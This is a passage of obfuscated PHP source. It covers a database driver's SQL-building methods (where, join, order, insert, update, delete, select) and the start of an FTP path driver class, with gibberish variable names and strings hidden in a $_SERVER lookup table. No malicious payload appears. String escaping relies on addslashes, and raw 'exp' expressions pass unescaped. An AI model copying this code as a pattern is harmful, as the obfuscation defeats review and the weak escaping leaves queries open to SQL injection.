implode($ş’øªğ[50], $Íøö´Ã); } protected function bindParam($ê­±Éø˜, $úéÄÂ¿) { $this->bind[$_SERVER[£ğ°ÖØø][4] . $ê­±Éø˜] = $úéÄÂ¿; } protected function parseBind($À‚Î†…) { $À‚Î†… = array_merge($this->bind, $À‚Î†…); $this->bind = array(); return $À‚Î†…; } function parseKey(&$×²÷ÀàŠ, $Ï çß‚ø = true) { if ($Ï çß‚ø) { $×²÷ÀàŠ = $this->parseKeyCheck($×²÷ÀàŠ); } return $×²÷ÀàŠ; } function parseKeyCheck($æ”ŸÉİ¼) { $ Š¬é¯İ =& $_SERVER[£ğ°ÖØø]; $æ”ŸÉİ¼ = trim($æ”ŸÉİ¼); if (!preg_match($ Š¬é¯İ[1057], $æ”ŸÉİ¼)) { think_exception($ Š¬é¯İ[1058] . $æ”ŸÉİ¼); } return $æ”ŸÉİ¼; } protected function parseValue($äªÑØøƒ) { $°şÑĞ‡  =& $_SERVER[£ğ°ÖØø]; if (is_string($äªÑØøƒ)) { $äªÑØøƒ = $°şÑĞ‡ [1018] . $this->escapeString($äªÑØøƒ) . $°şÑĞ‡ [1018]; } elseif (isset($äªÑØøƒ[0]) && is_string($äªÑØøƒ[0]) && strtolower($äªÑØøƒ[0]) == $°şÑĞ‡ [373]) { $äªÑØøƒ = $this->escapeString($äªÑØøƒ[1]); } elseif (is_array($äªÑØøƒ)) { $äªÑØøƒ = array_map(array($this, $°şÑĞ‡ [1019]), $äªÑØøƒ); } elseif (is_bool($äªÑØøƒ)) { $äªÑØøƒ = $äªÑØøƒ ? $°şÑĞ‡ [91] : $°şÑĞ‡ [228]; } elseif (is_null($äªÑØøƒ)) { $äªÑØøƒ = $°şÑĞ‡ [106]; } return $äªÑØøƒ; } protected function parseField($ÇÎİ§¼â) { $òŸşòò´ =& $_SERVER[£ğ°ÖØø]; if (is_string($ÇÎİ§¼â) && strpos($ÇÎİ§¼â, $òŸşòò´[50])) { $ÇÎİ§¼â = explode($òŸşòò´[50], $ÇÎİ§¼â); } if (is_array($ÇÎİ§¼â)) { $òÚøŞåÎ = array(); foreach ($ÇÎİ§¼â as $Ùãİ²å => $‰ê°ˆ“ó) { if (!is_numeric($Ùãİ²å)) { $òÚøŞåÎ[] = $this->parseKey($Ùãİ²å, !1) . $òŸşòò´[1059] . $this->parseKey($‰ê°ˆ“ó); } else { $òÚøŞåÎ[] = $this->parseKey($‰ê°ˆ“ó); } } $ì»æ•”˜ = implode($òŸşòò´[50], $òÚøŞåÎ); } elseif (is_string($ÇÎİ§¼â) && !empty($ÇÎİ§¼â)) { $ì»æ•”˜ = $ÇÎİ§¼â; } else { $ì»æ•”˜ = $òŸşòò´[220]; } return $ì»æ•”˜; } protected function parseTable($Ô¤˜—¿) { $ÆãÒåµ° =& $_SERVER[£ğ°ÖØø]; if (is_array($Ô¤˜—¿)) { $œ…ÍÉŒü = array(); foreach ($Ô¤˜—¿ as $§ÆÉ¿ÖÄ => $³Ûã–¡Ø) { if (!is_numeric($§ÆÉ¿ÖÄ)) { $œ…ÍÉŒü[] = $this->parseKey($§ÆÉ¿ÖÄ) . $ÆãÒåµ°[53] . $this->parseKey($³Ûã–¡Ø); } else { $œ…ÍÉŒü[] = $this->parseKey($§ÆÉ¿ÖÄ); } } $Ô¤˜—¿ = $œ…ÍÉŒü; } elseif (is_string($Ô¤˜—¿)) { if (strstr($Ô¤˜—¿, $ÆãÒåµ°[53])) { return $Ô¤˜—¿; } $Ô¤˜—¿ = explode($ÆãÒåµ°[50], $Ô¤˜—¿); array_walk($Ô¤˜—¿, array($this, $ÆãÒåµ°[967])); } return $ÆãÒåµ°[961] . trim(implode($ÆãÒåµ°[1060], $Ô¤˜—¿), $ÆãÒåµ°[470]) . $ÆãÒåµ°[961]; } protected function parseWhere($¯©€“Å›) { $ä˜ÈÊŠÛ =& $_SERVER[£ğ°ÖØø]; $Ì¥îÏ´Ã = $ä˜ÈÊŠÛ[12]; if (is_string($¯©€“Å›)) { $Ì¥îÏ´Ã = $¯©€“Å›; } else { $ê¨ôõÂï = isset($¯©€“Å›[$ä˜ÈÊŠÛ[1061]]) ? strtoupper($¯©€“Å›[$ä˜ÈÊŠÛ[1061]]) : $ä˜ÈÊŠÛ[12]; if (in_array($ê¨ôõÂï, array($ä˜ÈÊŠÛ[1062], $ä˜ÈÊŠÛ[1063], $ä˜ÈÊŠÛ[1064]))) { $ê¨ôõÂï = $ä˜ÈÊŠÛ[53] . $ê¨ôõÂï . $ä˜ÈÊŠÛ[53]; unset($¯©€“Å›[$ä˜ÈÊŠÛ[1061]]); } else { $ê¨ôõÂï = $ä˜ÈÊŠÛ[1065]; } foreach ($¯©€“Å› as $Ù‚Ô—ˆß => $°“£²²³) { $Ì¥îÏ´Ã .= $ä˜ÈÊŠÛ[354]; if (is_numeric($Ù‚Ô—ˆß)) { $Ù‚Ô—ˆß = $ä˜ÈÊŠÛ[1066]; } if (0 === strpos($Ù‚Ô—ˆß, $ä˜ÈÊŠÛ[11])) { $Ì¥îÏ´Ã .= $this->parseThinkWhere($Ù‚Ô—ˆß, $°“£²²³); } else { if (!preg_match($ä˜ÈÊŠÛ[1067], trim($Ù‚Ô—ˆß))) { think_exception(think_lang($ä˜ÈÊŠÛ[1068]) . $ä˜ÈÊŠÛ[4] . $Ù‚Ô—ˆß); } $£ÙØ½ê¶ = is_array($°“£²²³) && isset($°“£²²³[$ä˜ÈÊŠÛ[1069]]); $Ù‚Ô—ˆß = trim($Ù‚Ô—ˆß); if (strpos($Ù‚Ô—ˆß, $ä˜ÈÊŠÛ[214])) { $ğ¯ª†ÁÏ = explode($ä˜ÈÊŠÛ[214], $Ù‚Ô—ˆß); $ŒõÔ’ıï = array(); foreach ($ğ¯ª†ÁÏ as $ßÆŸÉÆİ => $°ãóîÔ³) { $æâå¡…í = $£ÙØ½ê¶ ? $°“£²²³[$ßÆŸÉÆİ] : $°“£²²³; $ŒõÔ’ıï[] = $ä˜ÈÊŠÛ[337] . $this->parseWhereItem($this->parseKey($°ãóîÔ³), $æâå¡…í) . $ä˜ÈÊŠÛ[966]; } $Ì¥îÏ´Ã .= implode($ä˜ÈÊŠÛ[1070], $ŒõÔ’ıï); } elseif (strpos($Ù‚Ô—ˆß, $ä˜ÈÊŠÛ[360])) { $ğ¯ª†ÁÏ = explode($ä˜ÈÊŠÛ[360], $Ù‚Ô—ˆß); $ŒõÔ’ıï = array(); foreach ($ğ¯ª†ÁÏ as $ßÆŸÉÆİ => $°ãóîÔ³) { $æâå¡…í = $£ÙØ½ê¶ ? $°“£²²³[$ßÆŸÉÆİ] : $°“£²²³; $ŒõÔ’ıï[] = $ä˜ÈÊŠÛ[337] . $this->parseWhereItem($this->parseKey($°ãóîÔ³), $æâå¡…í) . $ä˜ÈÊŠÛ[966]; } $Ì¥îÏ´Ã .= implode($ä˜ÈÊŠÛ[1065], $ŒõÔ’ıï); } else { $Ì¥îÏ´Ã .= $this->parseWhereItem($this->parseKey($Ù‚Ô—ˆß), $°“£²²³); } } $Ì¥îÏ´Ã .= $ä˜ÈÊŠÛ[355] . $ê¨ôõÂï; } $Ì¥îÏ´Ã = substr($Ì¥îÏ´Ã, 0, -strlen($ê¨ôõÂï)); } return empty($Ì¥îÏ´Ã) ? $ä˜ÈÊŠÛ[12] : $ä˜ÈÊŠÛ[1071] . $Ì¥îÏ´Ã; } protected function parseWhereItem($ê”Ï¡óû, $ô³å‘±Ñ) { $Èª®äÈÔ =& $_SERVER[£ğ°ÖØø]; $½®¹ê†­ = $Èª®äÈÔ[12]; if (is_array($ô³å‘±Ñ)) { if (is_string($ô³å‘±Ñ[0])) { $îÇ°Á³´ = strtolower($ô³å‘±Ñ[0]); if (in_array($ô³å‘±Ñ[0], array($Èª®äÈÔ[945], $Èª®äÈÔ[1072], $Èª®äÈÔ[1073], $Èª®äÈÔ[1074], $Èª®äÈÔ[1075], $Èª®äÈÔ[1076]))) { $½®¹ê†­ .= $ê”Ï¡óû . $Èª®äÈÔ[53] . $ô³å‘±Ñ[0] . $Èª®äÈÔ[53] . $this->parseValue($ô³å‘±Ñ[1]); } elseif (preg_match($Èª®äÈÔ[1077], $ô³å‘±Ñ[0])) { $½®¹ê†­ .= $ê”Ï¡óû . $Èª®äÈÔ[53] . $this->exp[$îÇ°Á³´] . $Èª®äÈÔ[53] . $this->parseValue($ô³å‘±Ñ[1]); } elseif (preg_match($Èª®äÈÔ[1078], $ô³å‘±Ñ[0])) { if (is_array($ô³å‘±Ñ[1])) { $¯øª™¯ = isset($ô³å‘±Ñ[2]) ? strtoupper($ô³å‘±Ñ[2]) : $Èª®äÈÔ[1063]; if (in_array($¯øª™¯, array($Èª®äÈÔ[1062], $Èª®äÈÔ[1063], $Èª®äÈÔ[1064]))) { $Õú˜–å¾ = array(); foreach ($ô³å‘±Ñ[1] as $…°ï×Æ…) { $Õú˜–å¾[] = $ê”Ï¡óû . $Èª®äÈÔ[53] . $this->exp[$îÇ°Á³´] . $Èª®äÈÔ[53] . $this->parseValue($…°ï×Æ…); } $½®¹ê†­ .= $Èª®äÈÔ[337] . implode($Èª®äÈÔ[53] . $¯øª™¯ . $Èª®äÈÔ[53], $Õú˜–å¾) . $Èª®äÈÔ[966]; } } else { $½®¹ê†­ .= $ê”Ï¡óû . $Èª®äÈÔ[53] . $this->exp[$îÇ°Á³´] . $Èª®äÈÔ[53] . $this->parseValue($ô³å‘±Ñ[1]); } } elseif ($Èª®äÈÔ[373] == $îÇ°Á³´) { $½®¹ê†­ .= $Èª®äÈÔ[964] . $ê”Ï¡óû . $Èª®äÈÔ[53] . $ô³å‘±Ñ[1] . $Èª®äÈÔ[1079]; } elseif (preg_match($Èª®äÈÔ[1080], $ô³å‘±Ñ[0])) { $½®¹ê†­ .= $ô³å‘±Ñ[0]; } elseif (preg_match($Èª®äÈÔ[1081], $ô³å‘±Ñ[0])) { if (isset($ô³å‘±Ñ[2]) && $Èª®äÈÔ[373] == $ô³å‘±Ñ[2]) { $½®¹ê†­ .= $ê”Ï¡óû . $Èª®äÈÔ[53] . $this->exp[$îÇ°Á³´] . $Èª®äÈÔ[53] . $ô³å‘±Ñ[1]; } else { if (is_string($ô³å‘±Ñ[1])) { $ô³å‘±Ñ[1] = explode($Èª®äÈÔ[50], $ô³å‘±Ñ[1]); } $‘²õÙ¼ = implode($Èª®äÈÔ[50], $this->parseValue($ô³å‘±Ñ[1])); $½®¹ê†­ .= $ê”Ï¡óû . $Èª®äÈÔ[53] . $this->exp[$îÇ°Á³´] . $Èª®äÈÔ[964] . $‘²õÙ¼ . $Èª®äÈÔ[966]; } } elseif (preg_match($Èª®äÈÔ[1082], $ô³å‘±Ñ[0])) { $€Šû‚è = is_string($ô³å‘±Ñ[1]) ? explode($Èª®äÈÔ[50], $ô³å‘±Ñ[1]) : $ô³å‘±Ñ[1]; $½®¹ê†­ .= $Èª®äÈÔ[964] . $ê”Ï¡óû . $Èª®äÈÔ[53] . $this->exp[$îÇ°Á³´] . $Èª®äÈÔ[53] . $this->parseValue($€Šû‚è[0]) . $Èª®äÈÔ[1065] . $this->parseValue($€Šû‚è[1]) . $Èª®äÈÔ[355]; } else { think_exception(think_lang($Èª®äÈÔ[1068]) . $Èª®äÈÔ[4] . $ô³å‘±Ñ[0]); } } else { $ÃÆ®§” = count($ô³å‘±Ñ); $¥Á‰¶ë– = $Èª®äÈÔ[12]; if (is_string($ô³å‘±Ñ[$ÃÆ®§” - 1])) { $¥Á‰¶ë– = isset($ô³å‘±Ñ[$ÃÆ®§” - 1]) ? strtoupper($ô³å‘±Ñ[$ÃÆ®§” - 1]) : $Èª®äÈÔ[12]; if (in_array($¥Á‰¶ë–, array($Èª®äÈÔ[1062], $Èª®äÈÔ[1063], $Èª®äÈÔ[1064]))) { $ÃÆ®§” = $ÃÆ®§” - 1; } } else { $¥Á‰¶ë– = $Èª®äÈÔ[1062]; } for ($°Ó‡âĞÕ = 0; $°Ó‡âĞÕ < $ÃÆ®§”; $°Ó‡âĞÕ++) { $€Šû‚è = is_array($ô³å‘±Ñ[$°Ó‡âĞÕ]) ? $ô³å‘±Ñ[$°Ó‡âĞÕ][1] : $ô³å‘±Ñ[$°Ó‡âĞÕ]; if ($Èª®äÈÔ[373] == strtolower($ô³å‘±Ñ[$°Ó‡âĞÕ][0])) { $½®¹ê†­ .= $Èª®äÈÔ[337] . $ê”Ï¡óû . $Èª®äÈÔ[53] . $€Šû‚è . $Èª®äÈÔ[1079] . $¥Á‰¶ë– . $Èª®äÈÔ[53]; } else { $çİœùó = is_array($ô³å‘±Ñ[$°Ó‡âĞÕ]) ? $this->exp[strtolower($ô³å‘±Ñ[$°Ó‡âĞÕ][0])] : $Èª®äÈÔ[945]; if (!$çİœùó && is_array($ô³å‘±Ñ[$°Ó‡âĞÕ]) && in_array($ô³å‘±Ñ[$°Ó‡âĞÕ][0], array($Èª®äÈÔ[945], $Èª®äÈÔ[1072], $Èª®äÈÔ[1073], $Èª®äÈÔ[1074], $Èª®äÈÔ[1075], $Èª®äÈÔ[1076]))) { $çİœùó = $ô³å‘±Ñ[$°Ó‡âĞÕ][0]; } $½®¹ê†­ .= $Èª®äÈÔ[337] . $ê”Ï¡óû . $Èª®äÈÔ[53] . $çİœùó . $Èª®äÈÔ[53] . $this->parseValue($€Šû‚è) . $Èª®äÈÔ[1079] . $¥Á‰¶ë– . $Èª®äÈÔ[53]; } } $½®¹ê†­ = substr($½®¹ê†­, 0, -4); } } else { $½®¹ê†­ .= $ê”Ï¡óû . $Èª®äÈÔ[1083] . $this->parseValue($ô³å‘±Ñ); } return $½®¹ê†­; } protected function parseThinkWhere($²–ÅËÂÏ, $Úı¼ÈúÑ) { $»Èüê¿¼ =& $_SERVER[£ğ°ÖØø]; $“¬¬Ë = $»Èüê¿¼[12]; switch ($²–ÅËÂÏ) { case $»Èüê¿¼[428]: $“¬¬Ë = $Úı¼ÈúÑ; break; case $»Èüê¿¼[1066]: $“¬¬Ë = is_string($Úı¼ÈúÑ) ? $Úı¼ÈúÑ : substr($this->parseWhere($Úı¼ÈúÑ), 6); break; case $»Èüê¿¼[1084]: parse_str($Úı¼ÈúÑ, $»‹ÊƒÜ¾); if (isset($»‹ÊƒÜ¾[$»Èüê¿¼[1061]])) { $Ëæ“§µÄ = $»Èüê¿¼[53] . strtoupper($»‹ÊƒÜ¾[$»Èüê¿¼[1061]]) . $»Èüê¿¼[53]; unset($»‹ÊƒÜ¾[$»Èüê¿¼[1061]]); } else { $Ëæ“§µÄ = $»Èüê¿¼[1065]; } $“æææ« = array(); foreach ($»‹ÊƒÜ¾ as $¡İ‚¶³‰ => $€‹ŠÁ·ü) { $“æææ«[] = $this->parseKey($¡İ‚¶³‰) . $»Èüê¿¼[1083] . $this->parseValue($€‹ŠÁ·ü); } $“¬¬Ë = implode($Ëæ“§µÄ, $“æææ«); break; } return $“¬¬Ë; } protected function parseLimit($‘ÈÁ§õÚ) { $š¹«›‰À =& $_SERVER[£ğ°ÖØø]; return !empty($‘ÈÁ§õÚ) ? $š¹«›‰À[51] . $‘ÈÁ§õÚ . $š¹«›‰À[53] : $š¹«›‰À[12]; } protected function parseJoin($›ğ¶È²Ø) { $Î§–øÇÙ =& $_SERVER[£ğ°ÖØø]; $ ¦¤åÚå = $Î§–øÇÙ[12]; if (!empty($›ğ¶È²Ø)) { if (is_array($›ğ¶È²Ø)) { foreach ($›ğ¶È²Ø as $Ì˜üÃ’À => $îò×È«Ù) { if (!1 !== stripos($îò×È«Ù, $Î§–øÇÙ[1085])) { $ ¦¤åÚå .= $Î§–øÇÙ[53] . $îò×È«Ù; } else { $ ¦¤åÚå .= $Î§–øÇÙ[1086] . $îò×È«Ù; } } } else { $ ¦¤åÚå .= $Î§–øÇÙ[1086] . $›ğ¶È²Ø; } } $ ¦¤åÚå = preg_replace($Î§–øÇÙ[1087], think_config($Î§–øÇÙ[991]) . $Î§–øÇÙ[1088], $ ¦¤åÚå); return $ ¦¤åÚå; } protected function parseOrder($Ş¢ÖÚ¦“) { $œğ‡Ş =& $_SERVER[£ğ°ÖØø]; if (is_array($Ş¢ÖÚ¦“)) { $¬äËÕ¾± = array(); foreach ($Ş¢ÖÚ¦“ as $ºå±“³· => $ŠÄßÊ°) { if (is_numeric($ºå±“³·)) { $¬äËÕ¾±[] = $this->parseKey($ŠÄßÊ°); } else { $ŠÄßÊ° = in_array(strtoupper(trim($ŠÄßÊ°)), array($œğ‡Ş[1089], $œğ‡Ş[1090])) ? $œğ‡Ş[53] . $ŠÄßÊ° : $œğ‡Ş[12]; if (preg_match($œğ‡Ş[1091], $ºå±“³·)) { $¬äËÕ¾±[] = $this->parseKey($ºå±“³·) . $ŠÄßÊ°; } else { think_exception($œğ‡Ş[1092] . $ºå±“³·); } } } $Ş¢ÖÚ¦“ = implode($œğ‡Ş[50], $¬äËÕ¾±); } return !empty($Ş¢ÖÚ¦“) ? $œğ‡Ş[1093] . $Ş¢ÖÚ¦“ : $œğ‡Ş[12]; } protected function parseGroup($õç¾¨±Ã) { $«¦â¦’ =& $_SERVER[£ğ°ÖØø]; return !empty($õç¾¨±Ã) ? $«¦â¦’[1094] . $õç¾¨±Ã : $«¦â¦’[12]; } protected function parseHaving($´Ë×¡Ïü) { $Çóô­¢é =& $_SERVER[£ğ°ÖØø]; return !empty($´Ë×¡Ïü) ? $Çóô­¢é[1095] . $´Ë×¡Ïü : $Çóô­¢é[12]; } protected function parseComment($õËÌ²î˜) { $­òø’ – =& $_SERVER[£ğ°ÖØø]; return !empty($õËÌ²î˜) ? $­òø’ –[1096] . $õËÌ²î˜ . $­òø’ –[1097] : $­òø’ –[12]; } protected function parseDistinct($Èàä¬ÜÈ) { $«ˆ¹ùñ =& $_SERVER[£ğ°ÖØø]; return !empty($Èàä¬ÜÈ) ? $«ˆ¹ùñ[1098] : $«ˆ¹ùñ[12]; } protected function parseUnion($ÍÁşºÆ¦) { $’È§Á× =& $_SERVER[£ğ°ÖØø]; if (empty($ÍÁşºÆ¦)) { return $’È§Á×[12]; } if (isset($ÍÁşºÆ¦[$’È§Á×[424]])) { $¦Ê’ØÔÙ = $’È§Á×[1099]; unset($ÍÁşºÆ¦[$’È§Á×[424]]); } else { $¦Ê’ØÔÙ = $’È§Á×[1100]; } foreach ($ÍÁşºÆ¦ as $ü‚€Óå) { $àÇ×î“[] = $¦Ê’ØÔÙ . (is_array($ü‚€Óå) ? $this->buildSelectSql($ü‚€Óå) : $ü‚€Óå); } return implode($’È§Á×[53], $àÇ×î“); } public function insert($°Ì¢Ö­ , $ÑÙê»ì = array(), $ıºŞºœ = false) { $Îğâòáã =& $_SERVER[£ğ°ÖØø]; $ÄœÀ‰¯ = $“¼È»±¾ = array(); $this->model = $ÑÙê»ì[$Îğâòáã[358]]; foreach ($°Ì¢Ö­  as $¦¥ÃéÏ¹ => $ÛÒØîåÁ) { if (is_array($ÛÒØîåÁ) && $Îğâòáã[373] == $ÛÒØîåÁ[0]) { $“¼È»±¾[] = $this->parseKey($¦¥ÃéÏ¹); $ÄœÀ‰¯[] = $ÛÒØîåÁ[1]; } elseif (is_scalar($ÛÒØîåÁ) || is_null($ÛÒØîåÁ)) { $“¼È»±¾[] = $this->parseKey($¦¥ÃéÏ¹); $ÄœÀ‰¯[] = $this->parseValue($ÛÒØîåÁ); } } $ÏÚÈ®…¬ = ($ıºŞºœ ? $Îğâòáã[968] : $Îğâòáã[969]) . $Îğâòáã[970] . $this->parseTable($ÑÙê»ì[$Îğâòáã[356]]) . $Îğâòáã[964] . implode($Îğâòáã[50], $“¼È»±¾) . $Îğâòáã[965] . implode($Îğâòáã[50], $ÄœÀ‰¯) . $Îğâòáã[966]; $ÏÚÈ®…¬ .= $this->parseLock(isset($ÑÙê»ì[$Îğâòáã[907]]) ? $ÑÙê»ì[$Îğâòáã[907]] : !1); $ÏÚÈ®…¬ .= $this->parseComment(!empty($ÑÙê»ì[$Îğâòáã[430]]) ? $ÑÙê»ì[$Îğâòáã[430]] : $Îğâòáã[12]); return $this->execute($ÏÚÈ®…¬, $this->parseBind(!empty($ÑÙê»ì[$Îğâòáã[361]]) ? $ÑÙê»ì[$Îğâòáã[361]] : array())); } public function selectInsert($ÎÑ—÷±Ä, $œÀŒÊŠ, $¿ÚÇàêÒ = array()) { $„óè„Ş =& $_SERVER[£ğ°ÖØø]; $this->model = $¿ÚÇàêÒ[$„óè„Ş[358]]; if (is_string($ÎÑ—÷±Ä)) { $ÎÑ—÷±Ä = explode($„óè„Ş[50], $ÎÑ—÷±Ä); } array_walk($ÎÑ—÷±Ä, array($this, $„óè„Ş[967])); $ç¤°½åü = $„óè„Ş[1101] . $this->parseTable($œÀŒÊŠ) . $„óè„Ş[964] . implode($„óè„Ş[50], $ÎÑ—÷±Ä) . $„óè„Ş[1079]; $ç¤°½åü .= $this->buildSelectSql($¿ÚÇàêÒ); return $this->execute($ç¤°½åü, $this->parseBind(!empty($¿ÚÇàêÒ[$„óè„Ş[361]]) ? $¿ÚÇàêÒ[$„óè„Ş[361]] : array())); } public function update($£ŠŸç¯ä, $¾û´Ÿí) { $Õ‡œüúñ =& $_SERVER[£ğ°ÖØø]; $this->model = $¾û´Ÿí[$Õ‡œüúñ[358]]; $Ÿ “ÙáŠ = $Õ‡œüúñ[1102] . $this->parseTable($¾û´Ÿí[$Õ‡œüúñ[356]]) . $this->parseSet($£ŠŸç¯ä) . $this->parseWhere(!empty($¾û´Ÿí[$Õ‡œüúñ[352]]) ? $¾û´Ÿí[$Õ‡œüúñ[352]] : $Õ‡œüúñ[12]) . $this->parseOrder(!empty($¾û´Ÿí[$Õ‡œüúñ[450]]) ? $¾û´Ÿí[$Õ‡œüúñ[450]] : $Õ‡œüúñ[12]) . $this->parseLimit(!empty($¾û´Ÿí[$Õ‡œüúñ[368]]) ? $¾û´Ÿí[$Õ‡œüúñ[368]] : $Õ‡œüúñ[12]) . $this->parseLock(isset($¾û´Ÿí[$Õ‡œüúñ[907]]) ? $¾û´Ÿí[$Õ‡œüúñ[907]] : !1) . $this->parseComment(!empty($¾û´Ÿí[$Õ‡œüúñ[430]]) ? $¾û´Ÿí[$Õ‡œüúñ[430]] : $Õ‡œüúñ[12]); return $this->execute($Ÿ “ÙáŠ, $this->parseBind(!empty($¾û´Ÿí[$Õ‡œüúñ[361]]) ? $¾û´Ÿí[$Õ‡œüúñ[361]] : array())); } public function delete($´¬ò€Šø = array()) { $Çí“¢õ¹ =& $_SERVER[£ğ°ÖØø]; $this->model = $´¬ò€Šø[$Çí“¢õ¹[358]]; $ùæÎ‘£ = $Çí“¢õ¹[1103] . $this->parseTable($´¬ò€Šø[$Çí“¢õ¹[356]]) . $this->parseWhere(!empty($´¬ò€Šø[$Çí“¢õ¹[352]]) ? $´¬ò€Šø[$Çí“¢õ¹[352]] : $Çí“¢õ¹[12]) . $this->parseOrder(!empty($´¬ò€Šø[$Çí“¢õ¹[450]]) ? $´¬ò€Šø[$Çí“¢õ¹[450]] : $Çí“¢õ¹[12]) . $this->parseLimit(!empty($´¬ò€Šø[$Çí“¢õ¹[368]]) ? $´¬ò€Šø[$Çí“¢õ¹[368]] : $Çí“¢õ¹[12]) . $this->parseLock(isset($´¬ò€Šø[$Çí“¢õ¹[907]]) ? $´¬ò€Šø[$Çí“¢õ¹[907]] : !1) . $this->parseComment(!empty($´¬ò€Šø[$Çí“¢õ¹[430]]) ? $´¬ò€Šø[$Çí“¢õ¹[430]] : $Çí“¢õ¹[12]); return $this->execute($ùæÎ‘£, $this->parseBind(!empty($´¬ò€Šø[$Çí“¢õ¹[361]]) ? $´¬ò€Šø[$Çí“¢õ¹[361]] : array())); } public function select($ÓÉşıÓ = array()) { $¤ôØÉ°ù =& $_SERVER[£ğ°ÖØø]; $this->model = $ÓÉşıÓ[$¤ôØÉ°ù[358]]; $Ÿñ¦ = $this->buildSelectSql($ÓÉşıÓ); $ü’Â›‡å = isset($ÓÉşıÓ[$¤ôØÉ°ù[425]]) ? $ÓÉşıÓ[$¤ôØÉ°ù[425]] : !1; if ($ü’Â›‡å) { $²¡Åº¡Æ = is_string($ü’Â›‡å[$¤ôØÉ°ù[97]]) ? $ü’Â›‡å[$¤ôØÉ°ù[97]] : $¤ôØÉ°ù[1104] . md5($Ÿñ¦); $â«§ºØä = think_cache($²¡Åº¡Æ, $¤ôØÉ°ù[12], $ü’Â›‡å); if (!1 !== $â«§ºØä) { return $â«§ºØä; } } $ÊìÙé¬ = $this->query($Ÿñ¦, $this->parseBind(!empty($ÓÉşıÓ[$¤ôØÉ°ù[361]]) ? $ÓÉşıÓ[$¤ôØÉ°ù[361]] : array())); if ($ü’Â›‡å && !1 !== $ÊìÙé¬) { think_cache($²¡Åº¡Æ, $ÊìÙé¬, $ü’Â›‡å); } return $ÊìÙé¬; } public function buildSelectSql($Á”ÎëÆ = array()) { $†à¼ŸŞ =& $_SERVER[£ğ°ÖØø]; if (isset($Á”ÎëÆ[$†à¼ŸŞ[429]])) { if (strpos($Á”ÎëÆ[$†à¼ŸŞ[429]], $†à¼ŸŞ[50])) { list($¡˜ ¤¾ë, $äØì¸°Å) = explode($†à¼ŸŞ[50], $Á”ÎëÆ[$†à¼ŸŞ[429]]); } else { $¡˜ ¤¾ë = $Á”ÎëÆ[$†à¼ŸŞ[429]]; } $¡˜ ¤¾ë = $¡˜ ¤¾ë ? $¡˜ ¤¾ë : 1; $äØì¸°Å = isset($äØì¸°Å) ? $äØì¸°Å : (is_numeric($Á”ÎëÆ[$†à¼ŸŞ[368]]) ? $Á”ÎëÆ[$†à¼ŸŞ[368]] : 20); $”õ®Ëü‘ = $äØì¸°Å * ((int) $¡˜ ¤¾ë - 1); $Á”ÎëÆ[$†à¼ŸŞ[368]] = $”õ®Ëü‘ . $†à¼ŸŞ[50] . $äØì¸°Å; } if (think_config($†à¼ŸŞ[1105])) { $ûÊÕ = $†à¼ŸŞ[1106] . md5(serialize($Á”ÎëÆ)); $âê§Ô¾ª = think_cache($ûÊÕ); if ($âê§Ô¾ª) { return $âê§Ô¾ª; } } $·õŞ²ÊÚ = $this->parseSql($this->selectSql, $Á”ÎëÆ); $·õŞ²ÊÚ .= $this->parseLock(isset($Á”ÎëÆ[$†à¼ŸŞ[907]]) ? $Á”ÎëÆ[$†à¼ŸŞ[907]] : !1); if (isset($ûÊÕ)) { think_cache($ûÊÕ, $·õŞ²ÊÚ); } return $·õŞ²ÊÚ; } public function parseSql($£Í‰ıñ, $°ûß¾‚— = array()) { $ÇŠÃ´ü =& $_SERVER[£ğ°ÖØø]; $£Í‰ıñ = str_replace(array($ÇŠÃ´ü[1107], $ÇŠÃ´ü[1108], $ÇŠÃ´ü[1109], $ÇŠÃ´ü[1110], $ÇŠÃ´ü[1111], $ÇŠÃ´ü[1112], $ÇŠÃ´ü[1113], $ÇŠÃ´ü[1114], $ÇŠÃ´ü[1115], $ÇŠÃ´ü[1116], $ÇŠÃ´ü[1117]), array($this->parseTable("{$°ûß¾‚—[$ÇŠÃ´ü[356]]}"), $this->parseDistinct(isset($°ûß¾‚—[$ÇŠÃ´ü[1118]]) ? $°ûß¾‚—[$ÇŠÃ´ü[1118]] : !1), $this->parseField(!empty($°ûß¾‚—[$ÇŠÃ´ü[350]]) ? $°ûß¾‚—[$ÇŠÃ´ü[350]] : $ÇŠÃ´ü[220]), $this->parseJoin(!empty($°ûß¾‚—[$ÇŠÃ´ü[359]]) ? $°ûß¾‚—[$ÇŠÃ´ü[359]] : $ÇŠÃ´ü[12]), $this->parseWhere(!empty($°ûß¾‚—[$ÇŠÃ´ü[352]]) ? $°ûß¾‚—[$ÇŠÃ´ü[352]] : $ÇŠÃ´ü[12]), $this->parseGroup(!empty($°ûß¾‚—[$ÇŠÃ´ü[587]]) ? $°ûß¾‚—[$ÇŠÃ´ü[587]] : $ÇŠÃ´ü[12]), $this->parseHaving(!empty($°ûß¾‚—[$ÇŠÃ´ü[1119]]) ? $°ûß¾‚—[$ÇŠÃ´ü[1119]] : $ÇŠÃ´ü[12]), $this->parseOrder(!empty($°ûß¾‚—[$ÇŠÃ´ü[450]]) ? $°ûß¾‚—[$ÇŠÃ´ü[450]] : $ÇŠÃ´ü[12]), $this->parseLimit(!empty($°ûß¾‚—[$ÇŠÃ´ü[368]]) ? $°ûß¾‚—[$ÇŠÃ´ü[368]] : $ÇŠÃ´ü[12]), $this->parseUnion(!empty($°ûß¾‚—[$ÇŠÃ´ü[423]]) ? $°ûß¾‚—[$ÇŠÃ´ü[423]] : $ÇŠÃ´ü[12]), $this->parseComment(!empty($°ûß¾‚—[$ÇŠÃ´ü[430]]) ? $°ûß¾‚—[$ÇŠÃ´ü[430]] : $ÇŠÃ´ü[12])), $£Í‰ıñ); return $£Í‰ıñ; } public function getLastSql($¨ú«Â„ = '') { return $¨ú«Â„ ? $this->modelSql[$¨ú«Â„] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ú•ëÃš×) { return addslashes($ú•ëÃš×); } public function setModel($´ŞØ°ïã) { $this->model = $´ŞØ°ïã; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto e¬Å§ÍùÌñ; d„Ì¿ºàÕ±: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($èòóœùÂ) { parent::__construct(); if (count($èòóœùÂ) > 0) { $this->_init($èòóœùÂ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ûñƒÇ¸¨) { $’‚¨¥ =& $_SERVER[£ğ°ÖØø]; global 